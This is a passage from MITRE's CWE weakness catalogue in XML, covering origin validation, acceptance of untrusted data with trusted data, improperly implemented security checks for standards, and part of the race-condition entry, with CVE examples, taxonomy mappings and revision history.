               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0877</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1452</Reference>
               <Description>DNS server caches glue records received from non-delegated name servers</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1452</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2188</Reference>
               <Description>user ID obtained from untrusted source (URL)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2188</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0174</Reference>
               <Description>LDAP service does not verify if a particular attribute was set by the LDAP server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1549</Reference>
               <Description>product does not sufficiently distinguish external HTML from internal, potentially dangerous HTML, allowing bypass using special strings in the page title. Overlaps special elements.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1549</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0981</Reference>
               <Description>product records the reverse DNS name of a visitor in the logs, allowing spoofing and resultant XSS.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0981</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Origin Validation Error</Entry_Name>
            </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 3-3</Entry_ID>
	      <Entry_Name>Req SR 2.12 RE(1)</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SD-1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SR-2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SVV-1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 2.12 RE(1)</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 3.1 RE(1)</Entry_Name>
	    </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="111"/>
            <Related_Attack_Pattern CAPEC_ID="141"/>
            <Related_Attack_Pattern CAPEC_ID="142"/>
            <Related_Attack_Pattern CAPEC_ID="160"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
            <Related_Attack_Pattern CAPEC_ID="510"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="89"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-324"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">This entry has some significant overlap with other CWE entries and may need some clarification. See terminology notes.</Note>
            <Note Type="Terminology">The "Origin Validation Error" term was originally used in a 1995 thesis [REF-324]. Although not formally defined, an issue is considered to be an origin validation error if either (1) "an object [accepts] input from an unauthorized subject," or (2) "the system [fails] to properly or completely authenticate a subject." A later section says that an origin validation error can occur when the system (1) "does not properly authenticate a user or process" or (2) "does not properly authenticate the shared data or libraries." The only example provided in the thesis (covered by OSVDB:57615) involves a setuid program running command-line arguments without dropping privileges. So, this definition (and its examples in the thesis) effectively cover other weaknesses such as CWE-287 (Improper Authentication), CWE-285 (Improper Authorization), and CWE-250 (Execution with Unnecessary Privileges). There appears to be little usage of this term today, except in the SecurityFocus vulnerability database, where the term is used for a variety of issues, including web-browser problems that allow violation of the Same Origin Policy and improper validation of the source of an incoming message.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Maintenance_Notes, References, Relationship_Notes, Relationships, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="349" Name="Acceptance of Extraneous Untrusted Data With Trusted Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product, when processing trusted data, accepts any untrusted data that is also included with the trusted data, treating the untrusted data as if it were trusted.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Integrity</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could package untrusted data with trusted data to bypass protection mechanisms to gain access to and possibly modify sensitive data.</Note>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0018</Reference>
               <Description>Does not verify that trusted entity is authoritative for all entities in its response.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0018</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-5462</Reference>
               <Description>use of extra data in a signature allows certificate signature forging</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-5462</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Untrusted Data Appended with Trusted Data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>ENV01-J</Entry_ID>
               <Entry_Name>Place all security-sensitive code in a single JAR and sign and seal it</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="141"/>
            <Related_Attack_Pattern CAPEC_ID="142"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Modes_of_Introduction, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Untrusted Data Appended with Trusted Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="358" Name="Improperly Implemented Security Check for Standard" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not implement or incorrectly implements one or more security-relevant checks as specified by the design of a standardized algorithm, protocol, or technique.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="345" View_ID="1000"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="290" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>This is an implementation error, in which the algorithm/technique requires certain security-related behaviors or conditions that are not implemented or checked properly, thus causing a vulnerability.</xhtml:p>
               </Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0862</Reference>
               <Description>Browser does not verify Basic Constraints of a certificate, even though it is required, allowing spoofing of trusted certificates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0862</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0970</Reference>
               <Description>Browser does not verify Basic Constraints of a certificate, even though it is required, allowing spoofing of trusted certificates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0970</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1407</Reference>
               <Description>Browser does not verify Basic Constraints of a certificate, even though it is required, allowing spoofing of trusted certificates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1407</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0198</Reference>
               <Description>Logic error prevents some required conditions from being enforced during Challenge-Response Authentication Mechanism with MD5 (CRAM-MD5).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2163</Reference>
               <Description>Shared secret not verified in a RADIUS response packet, allowing authentication bypass by spoofing server replies.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2163</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2181</Reference>
               <Description>Insufficient verification in VoIP implementation, in violation of standard, allows spoofed messages.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2181</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2182</Reference>
               <Description>Insufficient verification in VoIP implementation, in violation of standard, allows spoofed messages.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2182</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2298</Reference>
               <Description>Security check not applied to all components, allowing bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2298</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Improperly Implemented Security Check for Standard</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This is a "missing step" error on the product side, which can overlap weaknesses such as insufficient verification and spoofing. It is frequently found in cryptographic and authentication errors. It is sometimes resultant.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Observed_Examples, Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="362" Name="Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently.</Description>
         <Extended_Description>
            <xhtml:p>This can have security implications when the expected synchronization is in security-critical code, such as recording whether a user is authenticated or modifying important state information that should not be influenced by an outsider.</xhtml:p>
            <xhtml:p>A race condition occurs within concurrent environments, and is effectively a property of a code sequence. Depending on the context, a code sequence may be in the form of a function call, a small number of instructions, a series of program invocations, etc.</xhtml:p>
            <xhtml:p>A race condition violates these properties, which are closely related:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Exclusivity - the code sequence is given exclusive access to the shared resource, i.e., no other code sequence can modify properties of the shared resource before the original sequence has completed execution.</xhtml:li>
                  <xhtml:li>Atomicity - the code sequence is behaviorally atomic, i.e., no other thread or process can concurrently execute the same sequence of instructions (or a subset) against the same resource.</xhtml:li>
               </xhtml:ul>
            <xhtml:p>A race condition exists when an "interfering code sequence" can still access the shared resource, violating exclusivity. Programmers may assume that certain code sequences execute too quickly to be affected by an interfering code sequence; when they are not, this violates atomicity. For example, the single "x++" statement may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read (the original value of x), followed by a computation (x+1), followed by a write (save the result to x).</xhtml:p>
            <xhtml:p>The interfering code sequence could be "trusted" or "untrusted." A trusted interfering code sequence occurs within the product; it cannot be modified by the attacker, and it can only be invoked indirectly. An untrusted interfering code sequence can be authored directly by the attacker, and typically it is external to the vulnerable product.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="691" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="416" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="476" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Sometimes"/>
            <Language Name="C++" Prevalence="Sometimes"/>
            <Language Name="Java" Prevalence="Sometimes"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>When a race condition makes it possible to bypass a resource cleanup routine or trigger multiple initialization routines, it may lead to resource exhaustion (CWE-400).</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Instability</Impact>
               <Note>When a race condition allows multiple control flows to access a resource simultaneously, it might lead the product(s) into unexpected states, possibly resulting in a crash.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Note>When a race condition is combined with predictable resource names and loose permissions, it may be possible for an attacker to overwrite or access confidential data (CWE-59).</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Black box methods may be able to identify evidence of race conditions via methods such as multiple simultaneous connections, which may cause the software to become instable or crash. However, race conditions with very narrow timing windows would not be detectable.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>White Box</Method>
               <Description>Common idioms are detectable in white box analysis, such as time-of-check-time-of-use (TOCTOU) file operations (CWE-367), or double-checked locking (CWE-609).</Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</xhtml:p>
                  <xhtml:p>Race conditions may be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.</xhtml:p>
                  <xhtml:p>Insert breakpoints or delays in between relevant code statements to artificially expand the race window so that it will be easier to detect.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
